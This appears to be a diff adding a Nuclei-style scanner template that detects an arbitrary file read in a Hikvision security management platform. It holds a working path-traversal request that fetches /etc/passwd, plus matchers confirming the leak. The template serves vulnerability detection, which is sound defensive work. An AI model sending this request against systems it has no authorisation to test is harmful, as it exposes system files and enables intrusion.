@@ -1,0 +1,35 @@
+id: hikvision-download-anyfile-read
+
+info:
+  name: Hikvision Comprehensive Security Management Platform Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in Hikvision Comprehensive Security Management Platform by attempting to retrieve the /etc/passwd file.
+
+http:
+  - raw:
+      - |
+        GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "application/x-msdownload"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
